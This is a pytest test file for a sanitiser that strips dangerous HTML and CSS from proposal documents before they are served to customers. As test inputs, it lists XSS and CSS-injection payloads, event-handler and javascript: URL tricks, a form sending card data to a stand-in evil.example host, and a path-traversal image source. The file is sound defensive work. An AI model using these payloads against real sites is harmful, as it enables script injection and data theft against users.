"""The proposal sanitiser — what stands between free HTML written by a person
or an LLM and a customer's browser.

A blocking test file by design (the plan's "public routes protected by CI
tests"): every case below is a way proposal HTML or CSS could run script,
reach another server, or break out of its frame. The last group proves the
rich layout an LLM actually writes survives.
"""

from __future__ import annotations

import re
import time
from pathlib import Path
from urllib.parse import urlsplit

import pytest

from app.config import settings

from app.services.functions.errors import Invalid
from app.services.functions.sanitize import (
    HOSTED_FONTS,
    MAX_HTML_CHARS,
    file_id_from_url,
    proposal_document,
    public_file_url,
    referenced_file_ids,
    sanitize_css,
    sanitize_html,
    sanitize_proposal,
    sanitize_style_attribute,
)

FILE = "/api/public/files/3f2b9c1e-0000-4000-8000-00000000abcd"
#: Norm's own origin in whichever environment runs the tests (CI is "testing").
_parts = urlsplit(settings.app_url)
OWN = f"{_parts.scheme}://{_parts.netloc}"


def html(s: str) -> str:
    return sanitize_html(s)[0]


class TestScriptsAndHandlers:
    @pytest.mark.parametrize(
        "dirty",
        [
            "<script>alert(1)</script>",
            "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
            "<svg onload=alert(1)><script>alert(1)</script></svg>",
            "<math><mtext><script>alert(1)</script></mtext></math>",
            "<iframe src='https://evil.example'></iframe>",
            "<object data='x.swf'></object><embed src='x.swf'>",
            "<template><script>alert(1)</script></template>",
            "<noscript><img src=x onerror=alert(1)></noscript>",
        ],
    )
    def test_script_carriers_are_removed_with_their_content(self, dirty):
        out = html(f"<p>before</p>{dirty}<p>after</p>")
        assert "<script" not in out.lower()
        assert "alert" not in out
        assert "iframe" not in out and "object" not in out and "embed" not in out
        assert "<p>before</p>" in out and "<p>after</p>" in out

    @pytest.mark.parametrize(
        "attr",
        [
            'onclick="alert(1)"',
            'onmouseover="alert(1)"',
            'onerror="alert(1)"',
            "onfocus=alert(1) autofocus",
            'ONLOAD="alert(1)"',
        ],
    )
    def test_event_handlers_never_survive(self, attr):
        out = html(f"<div {attr}>x</div><img src='{FILE}' {attr}>")
        assert "alert" not in out
        assert re.search(r"\son[a-z]+=", out, re.IGNORECASE) is None

    def test_forms_and_inputs_are_unwrapped_to_text(self):
        out = html(
            "<form action='https://evil.example/steal'><input name=card>"
            "<button formaction='https://evil'>Pay now</button></form>"
        )
        assert "<form" not in out and "<input" not in out and "<button" not in out
        assert "evil" not in out
        assert "Pay now" in out

    def test_meta_base_and_link_tags_are_dropped(self):
        out = html(
            "<meta http-equiv='refresh' content='0;url=https://evil'>"
            "<base href='https://evil/'><link rel=stylesheet href='https://evil/x.css'>"
            "<p>ok</p>"
        )
        assert "evil" not in out
        assert out == "<p>ok</p>"

    def test_comments_are_stripped(self):
        assert html("<!--[if IE]><script>alert(1)</script><![endif]--><p>x</p>") == (
            "<p>x</p>"
        )


class TestUrls:
    @pytest.mark.parametrize(
        "href",
        [
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            " javascript:alert(1)",
            "java&#09;script:alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:msgbox(1)",
            "/relative/path",
            "//evil.example/x",
        ],
    )
    def test_dangerous_or_relative_links_lose_their_href(self, href):
        out = html(f'<a href="{href}">click</a>')
        assert "href" not in out
        assert "click" in out

    @pytest.mark.parametrize(
        "href",
        [
            "https://brewbar.co.nz/menu",
            "http://example.com",
            "mailto:events@brewbar.co.nz",
            "tel:+6491234567",
            "#menu",
        ],
    )
    def test_ordinary_links_survive_with_noopener(self, href):
        out = html(f'<a href="{href}">x</a>')
        assert f'href="{href}"' in out
        assert 'rel="noopener noreferrer"' in out

    @pytest.mark.parametrize(
        "src",
        [
            "https://evil.example/pixel.gif",
            f"{OWN}/api/other/thing.png",
            "data:image/png;base64,iVBORw0KGgo=",
            "javascript:alert(1)",
            "/api/public/files/../../etc/passwd",
            "/api/public/files/abc?x=1",
            "//evil.example/api/public/files/abc",
        ],
    )
    def test_images_only_from_norms_public_files(self, src):
        out = html(f'<img src="{src}" alt="a">')
        assert "src=" not in out

    def test_public_file_images_survive_and_own_origin_is_normalised(self):
        out = html(f'<img src="{FILE}" alt="deck"><img src="{OWN}{FILE}">')
        assert out.count(f'src="{FILE}"') == 2

    def test_srcset_is_dropped(self):
        out = html(f'<img src="{FILE}" srcset="https://evil/x.png 2x">')
        assert "srcset" not in out and "evil" not in out

    def test_file_url_helpers(self):
        assert public_file_url("abc-123") == "/api/public/files/abc-123"
        with pytest.raises(Invalid):
            public_file_url("../x")
        assert file_id_from_url(FILE) == FILE.rsplit("/", 1)[1]
        assert file_id_from_url("https://evil.example" + FILE) is None
        assert referenced_file_ids(
            f'<img src="{FILE}">', "a{background:url(/api/public/files/k1)}"
        ) == {
            FILE.rsplit("/", 1)[1],
            "k1",
        }


class TestCss:
    def test_import_and_font_face_are_dropped(self):
        out = sanitize_css(
            "@import url(https://evil/x.css); @import 'y.css';"
            "@font-face{font-family:X;src:url(https://fonts.example/x.woff2)}"
            "body{font-family:'Playfair Display',serif}"
        )
        assert (
            "@import" not in out
            and "@font-face" not in out
            and "fonts.example" not in out
        )
        assert "Playfair Display" in out

    @pytest.mark.parametrize(
        "decl",
        [
            "width:expression(alert(1))",
            "width:EXPRESSION(alert(1))",
            "behavior:url(x.htc)",
            "-moz-binding:url(http://evil/x.xml#xss)",
            "background:url(javascript:alert(1))",
            "background:url('javascript:alert(1)')",
            "background:url(https://evil.example/x.png)",
            "background-image:url(data:image/png;base64,AAAA)",
            r"background:u\72l(https://evil/x.png)",
            r"background:\75\72\6c(https://evil/x.png)",
            "background:u/**/rl(https://evil/x.png)",
            "background-image:image-set('https://evil/x.png' 1x)",
            "background:-webkit-image-set(url(https://evil/x.png) 1x)",
            "content:attr(data-x url)",
            "background:element(#foo)",
            "background:cross-fade(url(a.png),url(b.png),50%)",
            "list-style:url(https://evil/b.png)",
            "cursor:url(https://evil/c.cur),auto",
        ],
    )
    def test_dangerous_declarations_are_dropped(self, decl):
        out = sanitize_css(f".a{{color:red;{decl}}}")
        assert "evil" not in out
        assert "expression" not in out.lower()
        assert "javascript" not in out.lower()
        assert "data:" not in out
        assert ".a { color: red; }" == out

    def test_public_file_urls_survive_canonically(self):
        out = sanitize_css(
            f".hero{{background:url({FILE}) center/cover no-repeat}}"
            f".x{{background-image:URL( '{FILE}' )}}"
            f".y{{background:url({OWN}{FILE})}}"
        )
        assert out.count(f"url({FILE})") == 3
        assert OWN not in out

    def test_css_cannot_close_its_style_element(self):
        out = sanitize_css('.a{content:"</style><script>alert(1)</script>"}')
        assert "<" not in out
        assert "</style" not in out.lower()

    def test_unknown_at_rules_dropped_known_ones_kept(self):
        out = sanitize_css(
            "@namespace svg url(http://www.w3.org/2000/svg);"
            "@charset 'utf-8';"
            "@-moz-document url-prefix(){.a{color:red}}"
            "@media print{.noprint{display:none}}"
            "@supports (display:grid){.g{display:grid}}"
            "@keyframes fade{from{opacity:0}to{opacity:1}}"
            "@page{margin:12mm}"
        )
        assert (
            "@namespace" not in out
            and "@charset" not in out
            and "-moz-document" not in out
        )
        assert "@media print { .noprint { display: none; } }" in out
        assert "@supports" in out and "@keyframes fade" in out and "@page" in out

    def test_media_query_rules_are_cleaned_too(self):
        out = sanitize_css(
            "@media screen{.a{background:url(https://evil/x)}.b{color:blue}}"
        )
        assert "evil" not in out and ".b { color: blue; }" in out

    def test_style_attributes_follow_the_same_rules(self):
        assert sanitize_style_attribute("color:red;background:url(https://evil/x)") == (
            "color: red"
        )
        assert sanitize_style_attribute("width:expression(alert(1))") is None
        out = html('<p style="color:#333;background:url(javascript:alert(1))">x</p>')
        assert out == '<p style="color: #333">x</p>'

    def test_custom_properties_cannot_smuggle_a_url(self):
        out = sanitize_css(
            ":root{--bg:url(https://evil/x.png)} .a{background:var(--bg)}"
        )
        assert "evil" not in out
        assert "var(--bg)" in out


class TestRichLayoutSurvives:
    PROPOSAL = f"""
    <section class="cover" id="top" style="background-color:#1c2b39;color:#fff;padding:48px">
      <header><h1>Casey's 40th at Brew Bar</h1><p class="lede">Friday 4 December</p></header>
      <figure><img src="{FILE}" alt="The deck" width="640" height="400" loading="lazy">
        <figcaption>The deck at sunset</figcaption></figure>
    </section>
    <section class="pricing">
      <h2>Your options</h2>
      <table class="options" width="100%" cellpadding="8">
        <thead><tr><th scope="col">Space</th><th>Minimum spend</th></tr></thead>
        <tbody><tr><td>The Deck</td><td style="text-align:right">$5,000</td></tr>
        <tr><td colspan="2"><em>incl. GST</em></td></tr></tbody>
      </table>
      <ul><li><strong>Canapés</strong> on arrival</li><li>Bar tab of your choice</li></ul>
      <ol start="2"><li>Second</li></ol>
      <blockquote>We can't wait to host you.</blockquote>
      <p>Questions? <a href="mailto:events@brewbar.co.nz">Email us</a> or
      <a href="https://brewbar.co.nz">visit our site</a>.<br>Ngā mihi, <span class="sig">Fran</span></p>
      <hr>
    </section>"""

    def test_structure_text_and_attributes_are_kept(self):
        out = html(self.PROPOSAL)
        for fragment in (
            '<section class="cover" id="top"',
            "<header><h1>Casey's 40th at Brew Bar</h1>",
            f'<img src="{FILE}" alt="The deck" width="640" height="400" loading="lazy">',
            "<figcaption>The deck at sunset</figcaption>",
            '<table class="options" width="100%" cellpadding="8">',
            '<th scope="col">Space</th>',
            '<td colspan="2"><em>incl. GST</em></td>',
            "<li><strong>Canapés</strong> on arrival</li>",
            '<ol start="2">',
            "<blockquote>",
            'href="mailto:events@brewbar.co.nz"',
            "<hr>",
            "Ngā mihi",
        ):
            assert fragment in out, fragment
        assert "background-color: #1c2b39" in out

    def test_style_blocks_move_into_the_stylesheet(self):
        clean_html, clean_css = sanitize_proposal(
            "<style>.cover{background:#111;color:#fafafa}</style><section class='cover'>x</section>",
            "body{margin:0}",
        )
        assert "<style" not in clean_html and "background" not in clean_html
        assert "body { margin: 0; }" in clean_css
        assert ".cover { background: #111; color: #fafafa; }" in clean_css

    def test_full_documents_reduce_to_their_body(self):
        clean_html, clean_css = sanitize_proposal(
            "<!doctype html><html><head><title>Proposal</title>"
            "<style>h1{color:navy}</style></head><body><h1>Hi</h1></body></html>",
            "",
        )
        assert clean_html == "<h1>Hi</h1>"
        assert clean_css == "h1 { color: navy; }"

    def test_layout_css_survives(self):
        css = (
            ".grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:24px}"
            ".card{box-shadow:0 2px 8px rgba(0,0,0,.1);border-radius:var(--radius,12px)}"
            ".hero{background:linear-gradient(135deg,#1c2b39 0%,#49556a 100%)}"
            ".t{transform:translateY(-2px) rotate(1deg);transition:all .2s cubic-bezier(.2,.8,.2,1)}"
            "@media (max-width:600px){.grid{grid-template-columns:1fr}}"
        )
        out = sanitize_css(css)
        for fragment in (
            "repeat(auto-fit",
            "minmax(220px",
            "rgba(0,0,0,.1)",
            "var(--radius",
            "linear-gradient(",
            "cubic-bezier(",
        ):
            assert fragment in out, fragment

    def test_absurd_nesting_is_refused_not_a_crash(self):
        deep = ".a{width:calc" + "(" * 2000 + "1px" + ")" * 2000 + "}"
        with pytest.raises(Invalid):
            sanitize_css(deep)
        nested = "@media print{" * 2000 + ".a{color:red}" + "}" * 2000
        with pytest.raises(Invalid):
            sanitize_css(nested)
        out = html('<p style="width:calc' + "(" * 2000 + '1px">x</p>')
        assert out == "<p>x</p>"

    @pytest.mark.parametrize(
        "html",
        [
            "<div>" * 30000 + "x" + "</div>" * 30000,
            "<ul><li>" * 4000 + "x",
            "<span>" * 5000 + "x",
            "<br>" * 20001,
        ],
    )
    def test_html_the_parser_would_choke_on_is_refused_fast(self, html):
        # nh3's parser is quadratic in nesting (30,000 divs ~ 11 s): refuse
        # first, in one linear pass.
        started = time.perf_counter()
        with pytest.raises(Invalid, match="too deeply nested"):
            sanitize_proposal(html, "")
        with pytest.raises(Invalid):
            proposal_document(html, "")
        assert time.perf_counter() - started < 0.25

    def test_ordinary_nesting_is_untouched(self):
        deep_enough = "<div>" * 100 + "<p>x</p>" + "</div>" * 100
        assert "<p>x</p>" in html(deep_enough)
        # Unclosed paragraphs and list items don't count as nesting.
        sloppy = "<p>one<p>two<ul>" + "<li>item" * 500 + "</ul>"
        assert "two" in html(sloppy)

    def test_oversized_input_is_refused(self):
        with pytest.raises(Invalid):
            sanitize_html("x" * (MAX_HTML_CHARS + 1))


class TestDocument:
    def test_document_carries_a_strict_csp_and_resanitises(self):
        doc = proposal_document(
            "<p>Hi</p><script>alert(1)</script>",
            ".a{background:url(https://evil/x.png)}",
            title="Casey's <40th>",
        )
        assert doc.startswith("<!doctype html>")
        assert "Content-Security-Policy" in doc
        assert "default-src 'none'" in doc
        assert f"img-src {OWN}/api/public/files/" in doc
        assert "script" not in doc.replace("noscript", "")
        assert "evil" not in doc
        assert "<title>Casey&#x27;s &lt;40th&gt;</title>" in doc
        assert '<base target="_blank">' in doc

    def test_fonts_come_only_from_norms_hosted_set(self):
        """Owner, 16 Oct 2026: host the fonts ourselves — a proposal names a
        family, Norm's stylesheet supplies it, Google is never called."""
        doc = proposal_document(
            "<p>Hi</p>",
            "@import url(https://fonts.googleapis.com/css2?family=Inter);"
            "@font-face{font-family:X;src:url(https://evil/x.woff2)}"
            "p{font-family:'Playfair Display',Georgia,serif}",
        )
        assert f"font-src {OWN}/fonts/brand/;" in doc
        assert f"style-src 'unsafe-inline' {OWN}/fonts/brand/;" in doc
        assert f'<link rel="stylesheet" href="{OWN}/fonts/brand/fonts.css">' in doc
        assert "googleapis" not in doc and "evil" not in doc
        assert "Playfair Display" in doc

    def test_hosted_font_files_exist(self):
        """Every family in HOSTED_FONTS is in the web app's stylesheet, and
        every file the stylesheet names is committed."""
        folder = (
            Path(__file__).resolve().parents[2] / "web" / "public" / "fonts" / "brand"
        )
        css = (folder / "fonts.css").read_text()
        families = set(re.findall(r"font-family:'([^']+)'", css))
        assert families == set(HOSTED_FONTS)
        files = re.findall(r"url\(\./([^)]+)\)", css)
        assert files and all((folder / f).is_file() for f in files)
        assert all(
            (folder / f"LICENSE-{f.lower().replace(' ', '-')}.txt").is_file()
            for f in HOSTED_FONTS
        )
